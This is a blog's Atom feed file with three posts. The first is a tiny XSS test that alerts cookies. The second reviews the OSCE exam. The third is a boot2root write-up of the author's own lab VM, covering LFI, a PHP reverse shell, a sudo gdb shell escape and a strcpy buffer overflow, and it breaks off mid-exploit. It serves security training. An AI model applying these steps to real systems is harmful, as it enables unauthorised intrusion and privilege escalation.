@@ -1,0 +1,1315 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/musubi/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/musubi/" rel="alternate" type="text/html" /><updated>2020-03-07T17:39:58+08:00</updated><id>http://localhost:4000/musubi/feed.xml</id><title type="html">Musubi</title><subtitle>Hey visitor, welcome to my site! (๑&gt;ᴗ&lt;๑)</subtitle><entry><title type="html">XSStest</title><link href="http://localhost:4000/musubi/others/XSStest" rel="alternate" type="text/html" title="XSStest" /><published>2020-03-06T00:00:00+08:00</published><updated>2020-03-06T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/XSS</id><content type="html" xml:base="http://localhost:4000/musubi/others/XSStest">&lt;body onclick=&quot;meow()&quot;&gt;Meow &lt;/body&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;footer onclick=&quot;meowmeow()&quot;&gt;Meowmeow&lt;/footer&gt;
+
+&lt;script&gt;
+function meow() {
+    alert(document.cookie);  
+}
+function meowmeow() {
+    alert(document.domain);  
+}
+&lt;/script&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Meow Meowmeow</summary></entry><entry><title type="html">Push CTP , Pop OSCE : From advanced script kiddie to expert script kiddie</title><link href="http://localhost:4000/musubi/others/oscereview" rel="alternate" type="text/html" title="Push CTP , Pop OSCE : From advanced script kiddie to expert script kiddie" /><published>2020-03-03T00:00:00+08:00</published><updated>2020-03-03T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSCE_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oscereview">&lt;p&gt;Yee haw! Last week I just received a mail from Offsec saying that I have passed the Offensive Security Certified Expert (OSCE) exam and here is my review.&lt;/p&gt;
+
+&lt;p&gt;Right after OSCP, I’ve been thinking, what should I learn next? So I said to myself, maybe I should try learning basic exploit development..?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/nasahacked.gif&quot; alt=&quot;nasahacked&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;pre-osce&quot;&gt;Pre OSCE&lt;/h1&gt;
+
+&lt;p&gt;So, I started to learn assembly. I used the materials from this &lt;a href=&quot;http://opensecuritytraining.info/IntroX86.html&quot;&gt;site&lt;/a&gt; and revised for few weeks. I started to understand what are registers and their purposes, opcodes, how to use debugger, how to compile codes and other basic stuffs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/compiler.jpg&quot; alt=&quot;compiler&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, I filled some basic knowledge gaps by watching &lt;strong&gt;x86 Assembly and Shellcoding on Linux&lt;/strong&gt; videos from &lt;strong&gt;Pentester Academy&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/pentesteracademy.png&quot; alt=&quot;pentestacademy&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay, from here, I went to Corelan &lt;a href=&quot;http://opensecuritytraining.info/IntroX86.html&quot;&gt;site&lt;/a&gt; to improve my binary exploitation skills. These are the topics that I have covered for my preparation before enrolling in CTP.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 9 : Introduction to Win32 shellcoding&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 8 : Win32 Egg Hunting&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 7 : Unicode – from 0x00410041 to calc&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 3b : SEH Based Exploits – just another example&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 3 : SEH Based Exploits&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also went to &lt;a href=&quot;https://www.fuzzysecurity.com/tutorials.html&quot;&gt;fuzzysecurity&lt;/a&gt; to improve my skills. If you don’t know where to start/stop, just follow and understand what are taught below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/fuzzysecurity.png&quot; alt=&quot;fuzzysecurity&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When I thought that I’m pretty comfortable with basic exploit development, I started to enroll in the CTP course. But, wait! I need to solve the pre registration challenges &lt;a href=&quot;http://fc4.me/&quot;&gt;first&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/fc4.png&quot; alt=&quot;fc4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At first try, they were pretty hard, so I thought maybe, just maybe… because I procrastinated for few weeks before, I almost forgot what I have learned… Dang it!&lt;/p&gt;
+
+&lt;p&gt;So, I went back to reread all of the courses/topics mentioned above, then the second time I went to the site to complete the challenges, I passed and managed to get the registration key. The key was “tryharderlolimjokingthisisnotthekey” .&lt;/p&gt;
+
+&lt;h1 id=&quot;osce&quot;&gt;OSCE&lt;/h1&gt;
+
+&lt;p&gt;So, my journey has started. I used these learning techniques to improve my understanding of the syllabus in the course;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;watch the videos and follow along to complete the exercises&lt;/li&gt;
+  &lt;li&gt;repeat until you don’t need to watch the videos to complete the exercises&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/hacc.jpg&quot; alt=&quot;hacc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The method is quite repetitive and for lazy ass people like me, I tend to feel bored really fast and started to procrastinate. What I did to kill the boredom was, for topics like binary exploitations, AV bypass, PE backdooring, I looked up different PE online and then I applied what is taught in the course.&lt;/p&gt;
+
+&lt;p&gt;Of course, the practical applications will be quite different but the theories on how to exploit the binaries still remain the same. Sometimes, I encountered some problems, and with these problems, I managed to understand more and more about binary exploitations. So, basically, this is one of the ways to learn things, learn from mistakes.&lt;/p&gt;
+
+&lt;p&gt;Well the drawbacks are, you will start to overthink and sometimes will forget the basic but important things/theories. So, to overthink or not to overthink, it’s your choice.&lt;/p&gt;
+
+&lt;p&gt;Then comes the exam time. So, in the exam, you will be given some amount of challenges and you will need to solve it within 48 hours and you will have 24 hours to do the report. Stay calm and don’t panic. Take a rest. I REPEAT. TAKE A REST IF YOU ARE EXHAUSTED.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/busy.jpeg&quot; alt=&quot;busy&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;post-osce&quot;&gt;Post OSCE&lt;/h1&gt;
+
+&lt;p&gt;So… there is this one book that I bought as a prep to enhance my binary exploitation skills which is &lt;strong&gt;The Shellcoder Handbook (2nd Edition)&lt;/strong&gt;. After reading few pages, I realised that, this book is way bit more advanced than what I expected, so I put the book aside first. :&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;After I have passed OSCE certification exam, I think now it’s time to finish that book and level up!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/dogehacker.jpg&quot; alt=&quot;doge&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tips-and-tricks&quot;&gt;Tips and tricks&lt;/h3&gt;
+
+&lt;p&gt;So, here are the tips and tricks that I wanted to share with you guys;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Watch all of the videos and read everything in the PDF. Do not focus only on the binary exploitation part.&lt;/li&gt;
+  &lt;li&gt;Do all of the exercises again and again and again and again and again. (Trust me, you’ll thank me later for this.)&lt;/li&gt;
+  &lt;li&gt;Do not focus only on what is taught in the course, try to go a little bit further and explore as much as you want, but don’t dive too deep, you’ll drown yourself.&lt;/li&gt;
+  &lt;li&gt;Some people will say that everything you need to pass the exam is in the course, yes, but.. no.. It’s like, if &lt;strong&gt;A&lt;/strong&gt; is in the course, maybe &lt;strong&gt;a&lt;/strong&gt; or &lt;strong&gt;@&lt;/strong&gt; or even &lt;strong&gt;∀&lt;/strong&gt; is in the exam. So, it’s not &lt;strong&gt;A&lt;/strong&gt; for &lt;strong&gt;A&lt;/strong&gt;. (I don’t really know what I’m talking about lel)&lt;/li&gt;
+  &lt;li&gt;Don’t rely too much on pre generated shellcode, try to create your own shellcode from scratch. &lt;a href=&quot;https://www.exploit-db.com/docs/english/17065-manual-shellcode.pdf&quot;&gt;Check this out&lt;/a&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;These are some OSCE reviews that I found helpful on providing useful resources :&lt;/p&gt;
+
+&lt;p&gt;i. &lt;a href=&quot;https://www.thesubtlety.com/post/2017-02-11-osce-review/&quot;&gt;https://www.thesubtlety.com/post/2017-02-11-osce-review/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ii. &lt;a href=&quot;https://tulpa-security.com/2017/07/18/288/&quot;&gt;https://tulpa-security.com/2017/07/18/288/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;iii. &lt;a href=&quot;https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/&quot;&gt;https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;faq&quot;&gt;FAQ&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Q1&lt;/strong&gt;: Hi yunaranyancat, the course is outdated, should I take it? Or should I wait until they update the course?&lt;br /&gt;
+&lt;strong&gt;Meow&lt;/strong&gt;: Hi random stranger, for me personally, there are quite amount of difference in knowledge before and after I enrolled in CTP. For me, I agree the techniques might be outdated, but what I think is, Offsec is trying to teach you the foundation of the methodologies focused on exploit development, advanced web attacks, WAN attacks , etc.. Of course they can update it to fit the latest trends of AV bypass techniques, advanced binary exploitation, hacking SCADA or anything, but IMHO, these should be in the OSEE domain. Like OSCP, what they are trying to deliver is the foundation of the pentesting methodologies, and it is up to us to further enhance it and try to keep up to fit in current trends. However, again, I won’t deny that the techniques are outdated but the methodologies that I gained can be applied on today’s exploitation. I’m not saying I’m an expert so I’ll just say I’m the pro in the script kiddies domain.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Q2&lt;/strong&gt;: Is taking OSCE the only way I can learn binary exploitations/exploit development?&lt;br /&gt;
+&lt;strong&gt;Meow&lt;/strong&gt; : No, not at all. There are other courses that offer the same thing such as eLearnSecurity XDS , Corelan trainings, etc.. You don’t even need a cert to say that you “know” exploit development. For me, certifications act as my own way of benchmarking my skillset. I know that I will surely forget what I have learned in OSCE, OSCP etc.. if I didn’t maintain my technical skills, so it is up to my responsibilities to maintain my qualifications as an OSCE holder. You don’t need to do the same way if you don’t want to. Knowledge can be gained even without certifications.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Q3&lt;/strong&gt;: Hi, can you tell me what are the exam questions?&lt;br /&gt;
+&lt;strong&gt;Meow&lt;/strong&gt; : Meow!&lt;/p&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+
+&lt;p&gt;Thank you for reading! See you next time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/shaw.gif&quot; alt=&quot;shaw&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
+
+&lt;p&gt;Special thanks to mreiaz and his cat, Kassim, Jasveer , and others who have helped me throughout the journey. Without you guys, I won’t be able to reach this far… You guys rocks!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/osce/bowmeow.gif&quot; alt=&quot;bowmeow&quot; /&gt;&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Yee haw! Last week I just received a mail from Offsec saying that I have passed the Offensive Security Certified Expert (OSCE) exam and here is my review.</summary></entry><entry><title type="html">VM Aqua Boot2Root Writeup - Speedrun Edition</title><link href="http://localhost:4000/musubi/others/vm_aqua" rel="alternate" type="text/html" title="VM Aqua Boot2Root Writeup - Speedrun Edition" /><published>2020-01-17T00:00:00+08:00</published><updated>2020-01-17T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/vm_aqua_writeup_SE</id><content type="html" xml:base="http://localhost:4000/musubi/others/vm_aqua">&lt;p&gt;Yo! This is my boot2root writeup for &lt;strong&gt;Aqua&lt;/strong&gt; vm. For those who didn’t manage to play with it yet, download the &lt;a href=&quot;#&quot;&gt;vm&lt;/a&gt; and come back when you have finished or when you are stuck.&lt;/p&gt;
+
+&lt;p&gt;or…, if you want to play with an easier vm, check this &lt;a href=&quot;https://www.vulnhub.com/entry/nezuko-1,352/&quot;&gt;out&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;about-aqua-vm&quot;&gt;About Aqua VM&lt;/h1&gt;
+
+&lt;p&gt;Name : Aqua&lt;/p&gt;
+
+&lt;p&gt;Difficulty : Intermediate to hard&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;In this case, the &lt;strong&gt;IP&lt;/strong&gt; for the target machine is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.2.6&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;These are the following open ports.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When going through the webpage, we found this page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When clicking the &lt;strong&gt;“Sure, I’ll help”&lt;/strong&gt;
+button, we are redirected to another page which shows a potential credential.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;megumin:watashiwamegumin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;When running &lt;strong&gt;nikto&lt;/strong&gt; on the target we found &lt;strong&gt;login.php&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;loginphp&quot;&gt;Login.php&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/4.2.png&quot; alt=&quot;4.2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the credential found, we managed to log in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;url&lt;/strong&gt; is vulnerable to &lt;strong&gt;LFI(local file inclusion)&lt;/strong&gt; as seen below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Upon further enumeration, we found that the port 21 can be opened by using port knocking. It was filtered when nmap result showed up. The knockd config file can be found at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/knockd.conf&lt;/code&gt; in the target machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Image below shows the result before and after port knocking.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the same credential , we managed to login into the &lt;strong&gt;FTP&lt;/strong&gt; service.&lt;/p&gt;
+
+&lt;p&gt;The content of &lt;strong&gt;hello.php&lt;/strong&gt; is the same as in the index page of &lt;strong&gt;Megumin&lt;/strong&gt; secret diary we saw last time. This means that if we put our &lt;strong&gt;php reverse shell&lt;/strong&gt; payload in this directory, we can get a shell by browsing through the page using &lt;strong&gt;LFI&lt;/strong&gt; vulnerability found earlier.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/9.1.png&quot; alt=&quot;9.1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The directory &lt;strong&gt;“production/”&lt;/strong&gt; is writable so we will put our reverse shell in there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file &lt;code class=&quot;highlighter-rouge&quot;&gt;notes&lt;/code&gt; revealed the absolute path of the current directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that, by going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.0.2.6/home.php?showcase=../deployment/production/ourreverseshell.php&lt;/code&gt; , our payload will be executed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-i&quot;&gt;Privilege escalation I&lt;/h2&gt;
+
+&lt;p&gt;Upon reading &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file, we found out that these users can run commands using &lt;strong&gt;sudo&lt;/strong&gt; privileges without password.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Aqua : /root/quotes, /root/esp, /usr/bin/gdb&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Megumin : /home/aqua/Desktop/backdoor&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the same credential, we managed to login as &lt;strong&gt;megumin&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-ii&quot;&gt;Privilege escalation II&lt;/h2&gt;
+
+&lt;p&gt;And as megumin, we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/aqua/Desktop/backdoor&lt;/code&gt; using sudo privilege.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When rerunning nmap on the target, we found that port &lt;strong&gt;1337&lt;/strong&gt; is open.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We then try to connect to the port using netcat and get a shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-iii---easier-method&quot;&gt;Privilege escalation III - Easier method&lt;/h2&gt;
+
+&lt;p&gt;As aqua we can run gdb with sudo privilege without using the password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can get a root shell using gdb by following command.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo gdb -nx -ex '!sh' -ex quit&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-iii---without-using-usrbingdb&quot;&gt;Privilege escalation III - Without using /usr/bin/gdb&lt;/h2&gt;
+
+&lt;p&gt;For your information, this is my intended path of getting to root shell. But as I want to give a great experience to everyone including those who didn’t know about buffer overflow on Linux, so I have decided to make an easier method to get into root.&lt;/p&gt;
+
+&lt;p&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /root/quotes&lt;/code&gt;, we know that the binary will print out our name and generate a random quote for us.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In aqua home directory, we can get the source code for &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/quotes&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/esp&lt;/code&gt; binaries which is located at this &lt;a href=&quot;https://github.com/yunaranyancat/personal_projects/tree/master/project_9&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We also know that &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/esp&lt;/code&gt; shows the address of the &lt;strong&gt;ESP&lt;/strong&gt; of the machine and that the &lt;strong&gt;ASLR&lt;/strong&gt; is not enabled.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Based on the source code, the possible vulnerable part is at the &lt;strong&gt;getname&lt;/strong&gt; method which uses &lt;strong&gt;strcpy&lt;/strong&gt;. If we put a name longer than the size of the buffer, this can corrupt the memory thus can be exploited to gain a shell via buffer overflow vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By knowing the environment of the target, we will make a debugging machine which is the exact copy of the target OS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems like the target OS is using &lt;strong&gt;Linux Lite 3.8 32 bits&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/lite.png&quot; alt=&quot;lite&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To mimic the situation of the target machine, we will download the source code for &lt;strong&gt;quotes.c&lt;/strong&gt; and &lt;strong&gt;esp.c&lt;/strong&gt; as root then debug it using non root user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By default, &lt;strong&gt;ASLR&lt;/strong&gt; is enabled. To disable &lt;strong&gt;ASLR&lt;/strong&gt;, run the following command.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then compile the binaries using following options.&lt;/p&gt;
+
+&lt;p&gt;esp.c : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fno-stack-protector -z execstack -no-pie esp.c -o esp&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;quotes.c ; &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fno-stack-protector -z execstack -no-pie quotes.c -o quotes&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then give sudo privilege to non root user to execute the binary and start debugging.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/27.png&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can use anything you want for the exploit development but in this writeup, I will be using &lt;a href=&quot;https://github.com/longld/peda&quot;&gt;peda&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Open the binary in gdb by running &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo gdb -q /root/quotes&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/28.png&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Disassemble the main program using &lt;code class=&quot;highlighter-rouge&quot;&gt;disas main&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/29.1.png&quot; alt=&quot;29.1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/29.2.png&quot; alt=&quot;29.2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Disassemble the getname function using &lt;code class=&quot;highlighter-rouge&quot;&gt;disas getname&lt;/code&gt; and we can see that the method &lt;strong&gt;strcpy&lt;/strong&gt; is being called.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/30.png&quot; alt=&quot;30&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s try to overflow the program by running &lt;code class=&quot;highlighter-rouge&quot;&gt;r $(python -c 'import sys;sys.stdout.write(&quot;A&quot;*100)')&lt;/code&gt; which will print out 100 A’s and will be parsed to the program as our &lt;strong&gt;name&lt;/strong&gt; variable.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/31.png&quot; alt=&quot;31&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems like we managed to overwrite the &lt;strong&gt;EIP&lt;/strong&gt;. To find the &lt;strong&gt;offset&lt;/strong&gt; of the &lt;strong&gt;EIP&lt;/strong&gt;, we need to use a pattern of unique strings. Since peda has this functionality, we can use them.&lt;/p&gt;
+
+&lt;p&gt;Create a pattern of 100 characters by running &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create 100 pat&lt;/code&gt; . This will store the pattern in a file called &lt;strong&gt;pat&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/32.png&quot; alt=&quot;32&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rerun the program and parse the &lt;strong&gt;pattern&lt;/strong&gt; as the name argument.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/33.png&quot; alt=&quot;33&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/33.2.png&quot; alt=&quot;33.2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using &lt;strong&gt;pattern_search&lt;/strong&gt; command in peda. We will find the offset of the EIP which is at &lt;strong&gt;44&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/34.png&quot; alt=&quot;34&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our exploit should be like this :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;A*44 + [EIP] + padding + shellcode&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, to verify if we have the right offset. We need to change our buffer.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb-peda$ r $(python -c 'import sys;sys.Stdout.write((&quot;A&quot;*44) + (&quot;B&quot;*4) + (&quot;\x90&quot;*32) + (&quot;C&quot;*23))')&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/35.png&quot; alt=&quot;35&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For padding, we will add &lt;strong&gt;32 bytes of NOPs&lt;/strong&gt; (no-operation opcode) so that it will do nothing and keep sliding to the next opcode until it reaches our shellcode. This is normally called as &lt;strong&gt;NOPsleds&lt;/strong&gt; or &lt;strong&gt;NOP slides&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/36.png&quot; alt=&quot;36&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see below, after the execution of the &lt;strong&gt;EIP&lt;/strong&gt;, our &lt;strong&gt;NOPs&lt;/strong&gt; are on top of the stack where &lt;strong&gt;ESP&lt;/strong&gt; points to. Based on the disassembled &lt;strong&gt;getname&lt;/strong&gt; method earlier, the last instruction is &lt;strong&gt;ret&lt;/strong&gt;.&lt;/p&gt;
+
